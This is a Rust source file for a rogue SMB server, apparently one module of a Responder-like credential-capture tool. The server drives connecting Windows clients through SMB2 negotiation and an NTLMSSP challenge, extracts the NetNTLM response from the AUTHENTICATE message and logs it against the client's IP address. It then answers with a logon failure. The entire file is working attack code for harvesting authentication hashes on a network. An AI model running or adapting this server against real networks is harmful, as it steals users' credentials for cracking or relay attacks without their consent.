//! Rogue SMB server (TCP 445/139). Drives the client through SMB2 NEGOTIATE + SESSION_SETUP
//! carrying NTLMSSP, capturing the AUTHENTICATE message.

use std::net::SocketAddr;
use std::sync::Arc;

use anyhow::Result;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

use crate::capture::model::{CaptureArtifact, Protocol};
use crate::constants::Service;
use crate::protocols::ntlm;
use crate::protocols::smb;

use super::ServerContext;

pub async fn serve(listener: TcpListener, ctx: Arc<ServerContext>) -> Result<()> {
    loop {
        let (stream, peer) = listener.accept().await?;
        let ctx = ctx.clone();
        tokio::spawn(async move {
            if let Err(e) = handle(stream, peer, ctx).await {
                tracing::debug!("smb connection from {peer} ended: {e}");
            }
        });
    }
}

fn parse_error_code(text: &str) -> Option<u32> {
    let t = text.trim();
    if let Some(hex) = t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
        u32::from_str_radix(hex, 16).ok()
    } else {
        t.parse::<u32>().ok()
    }
}

async fn handle(mut stream: TcpStream, peer: SocketAddr, ctx: Arc<ServerContext>) -> Result<()> {
    let challenge_bytes = ctx.challenge_for(Service::Smb);
    let challenge = ctx.build_challenge(Service::Smb);
    let session_id: u64 = 0x0000_0000_0000_1001;
    let mut hdr = [0u8; 4];

    loop {
        if stream.read_exact(&mut hdr).await.is_err() {
            break;
        }
        let len = ((hdr[1] as usize) << 16) | ((hdr[2] as usize) << 8) | hdr[3] as usize;
        if len == 0 || len > 1 << 20 {
            break;
        }
        let mut msg = vec![0u8; len];
        if stream.read_exact(&mut msg).await.is_err() {
            break;
        }
        let Some(header) = smb::Header::parse(&msg) else {
            // SMB1 or malformed: close the connection.
            break;
        };

        match header.command {
            smb::CMD_NEGOTIATE => {
                let resp = smb::negotiate::respond(&header, &ctx.server_guid);
                stream.write_all(&smb::netbios_frame(&resp)).await?;
            }
            smb::CMD_SESSION_SETUP => {
                let token = smb::session::parse_security_buffer(&msg)
                    .and_then(|t| smb::extract_ntlmssp(&t));
                let resp = match token.as_deref().and_then(ntlm::message_type) {
                    Some(1) => smb::session::respond(
                        &header,
                        smb::STATUS_MORE_PROCESSING_REQUIRED,
                        session_id,
                        &challenge,
                    ),
                    Some(3) => {
                        if let Some(net) = token
                            .as_deref()
                            .and_then(|t| ntlm::parse_type3(t, &challenge_bytes))
                        {
                            ctx.sink.artifact(CaptureArtifact::netntlm(
                                Protocol::Smb,
                                peer.ip(),
                                &net,
                            ));
                        }
                        let status = ctx
                            .cfg
                            .error_code
                            .as_deref()
                            .and_then(parse_error_code)
                            .unwrap_or(smb::STATUS_LOGON_FAILURE);
                        smb::session::respond(&header, status, session_id, &[])
                    }
                    _ => smb::session::respond(&header, smb::STATUS_LOGON_FAILURE, session_id, &[]),
                };
                stream.write_all(&smb::netbios_frame(&resp)).await?;
            }
            _ => {
                let mut h = header;
                h.status = smb::STATUS_ACCESS_DENIED;
                let mut out = Vec::new();
                h.write(&mut out);
                stream.write_all(&smb::netbios_frame(&out)).await?;
            }
        }
    }
    Ok(())
}
